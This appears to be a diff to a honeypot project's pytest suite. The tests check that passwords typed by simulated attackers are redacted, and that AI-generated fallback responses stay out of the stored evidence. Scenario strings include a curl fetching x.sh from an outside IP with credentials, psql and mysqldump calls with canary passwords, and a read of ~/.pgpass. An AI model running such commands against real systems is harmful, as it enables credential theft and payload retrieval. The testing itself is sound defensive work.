@@ -8,9 +8,7 @@ from datetime import UTC, datetime
 
 import asyncssh
 import pytest
-from sqlalchemy import create_engine, select
-from sqlalchemy.orm import sessionmaker
-from sqlalchemy.pool import StaticPool
+from sqlalchemy import select
 
 import app.immutability  # noqa: F401
 from app import services
@@ -25,6 +23,7 @@ from app.models import GatewayEvent, HoneypotSession, ServiceProfile, SessionEve
 from app.orchestration import session_manager as sm
 from app.runtime.docker_driver import HardenedDockerDriver
 from app.runtime.policy import ExecutionPolicy
+from tests.conftest import file_session_factory
 from tests.test_docker_build import BASE, STACKS, _docker, _running
 from tests.test_gateway import read_until
 
@@ -41,9 +40,7 @@ class Env:
 def env(request, tmp_path_factory):
     project = request.param
     client = _docker()
-    engine = create_engine("sqlite://", connect_args={"check_same_thread": False}, poolclass=StaticPool)
-    Base.metadata.create_all(engine)
-    sf = sessionmaker(bind=engine, expire_on_commit=False)
+    sf = file_session_factory(tmp_path_factory.mktemp("db"))  # several threads use it at once
     builder = DockerImageBuilder(client)
     e = Env()
     e.project, e.sf, e.client = project, sf, client
@@ -282,7 +279,9 @@ def test_everything_the_attacker_did_is_recorded_and_linked(env):
         kinds = [e.event_type for e in gw_events]
         assert kinds[0] == "connection.opened" and "session.created" in kinds and kinds[-1] == "connection.closed"
         login_ev = next(e for e in gw_events if e.event_type == "auth.password" and e.meta["user"] == "oracle")
-        assert login_ev.meta["password"] == "hunter2" and login_ev.source_ip == "127.0.0.1"
+        # default config: the attempted password is reduced to its length and a short hash
+        assert "password" not in login_ev.meta and login_ev.meta["password_len"] == 7 and login_ev.source_ip == "127.0.0.1"
+        assert "hunter2" not in str([e.meta for e in gw_events])
         last = list(s.scalars(select(HoneypotSession).order_by(HoneypotSession.started_at.desc())))[0]
         evs = list(s.scalars(select(SessionEvent).where(SessionEvent.session_id == last.id)))
         access = {e.meta["path"]: e.node_id for e in evs if e.event_type == "resource_access"}
@@ -292,3 +291,78 @@ def test_everything_the_attacker_did_is_recorded_and_linked(env):
             pg_ev = [e for e in evs if e.event_type == "service.postgres"]
             assert {e.meta["action"] for e in pg_ev} >= {"auth", "sql"} and all(e.node_id == env.nodes[f"/services/{pg}"].id for e in pg_ev)
             assert not any("password" in str(e.meta).lower() and "hunter2" in str(e.meta) for e in pg_ev)
+
+
+def test_credentials_an_attacker_types_are_not_stored(env):
+    """Default config, real SSH into a real twin: credentials in the login and in commands appear nowhere in the
+    database. (Real bash/curl do not echo them back here; stdout/stderr are otherwise stored as evidence.)"""
+    canaries = ["CANARY-LOGIN-pw-91", "CANARY-ENV-pw-92", "CANARY-CURL-pw-93", "CANARY-URL-pw-94", "CANARY-FLAG-pw-95"]
+
+    async def scenario(gw):
+        c = await login(gw, "deploy", canaries[0])
+        for cmd in (f"export DB_PASSWORD={canaries[1]}",
+                    f"curl -s -m 2 -u admin:{canaries[2]} http://198.51.100.7/x.sh",
+                    f"psql postgresql://shop:{canaries[3]}@198.51.100.7:5432/shop -c 'select 1'",
+                    f"mysqldump --password {canaries[4]} shop"):
+            await c.run(cmd, check=False)
+        c.close()
+        await c.wait_closed()
+        await asyncio.sleep(1)
+
+    run_gateway(env, scenario)
+    with env.sf() as s:
+        dump = []
+        for table in Base.metadata.sorted_tables:
+            dump += [str(tuple(row)) for row in s.execute(table.select())]
+    text = "\n".join(dump)
+    assert "198.51.100.7" in text  # the evidence around the secrets is kept
+    assert not [c for c in canaries if c in text]
+
+
+def test_unsupported_requests_get_an_out_of_band_ai_proposal(env):
+    """Phase 5A end to end: real clients in a real twin hit requests the fake services cannot answer. The attacker
+    gets the services' controlled errors; each gap becomes one validated ai_synthesis row, kept out of the evidence."""
+    from app.ai.synthesis import SynthesisWorker
+    from app.models import AiSynthesis, ExecutionObservation, ExecutionRequest
+    from tests.fakes import FakeProvider
+
+    http, pg = svc_of(env, "http"), svc_of(env, "postgres")
+    answers = {"postgres": {"kind": "error", "code": "42601", "message": "AI-PROPOSAL syntax error at or near x"},
+               "http": {"kind": "response", "status": 404, "body": {"error": "AI-PROPOSAL not found"}}}
+    synth = SynthesisWorker(FakeProvider(lambda ctx, _s: answers[ctx["protocol"]]), env.sf, timeout_s=2,
+                            max_per_session=10)
+    env.mgr.synthesizer = synth
+
+    async def scenario(gw):
+        c = await login(gw)
+        out = {}
+        if pg:
+            pgpass = (await c.run("cat ~/.pgpass", check=False)).stdout.strip().split(":")
+            out["psql"] = await c.run(f"psql -h {pg} -U {pgpass[3]} {pgpass[2]} -c 'gibberish here' 2>&1", check=False)
+        if http:
+            port = env.profile[http]["ports"][0][0] if env.profile[http]["ports"] else 80
+            out["curl"] = await c.run(f"curl -s -m 5 http://{http}:{port}/admin/login", check=False)
+        c.close()
+        await c.wait_closed()
+        return out
+
+    try:
+        out = run_gateway(env, scenario)
+        synth.drain()
+    finally:
+        env.mgr.synthesizer = None
+        synth.shutdown()
+    if pg:
+        assert "syntax error" in out["psql"].stdout and "AI-PROPOSAL" not in out["psql"].stdout  # the real error
+    if http:
+        assert "not found" in out["curl"].stdout and "AI-PROPOSAL" not in out["curl"].stdout
+    with env.sf() as s:
+        session_id = s.scalars(select(HoneypotSession).order_by(HoneypotSession.started_at.desc())).first().id
+        req_ids = set(s.scalars(select(ExecutionRequest.id).where(ExecutionRequest.session_id == session_id)))
+        rows = [r for r in s.scalars(select(AiSynthesis)) if r.request_id in req_ids]
+        evidence = str([o.result_metadata for o in s.scalars(
+            select(ExecutionObservation).where(ExecutionObservation.request_id.in_(req_ids)))])
+    assert sorted(r.response_metadata["proto"] for r in rows) == sorted(p for p, svc in (("postgres", pg), ("http", http))
+                                                                        if svc)
+    assert all(r.validation_status == "accepted" and r.response_metadata["served"] is False for r in rows)
+    assert "AI-PROPOSAL" not in evidence
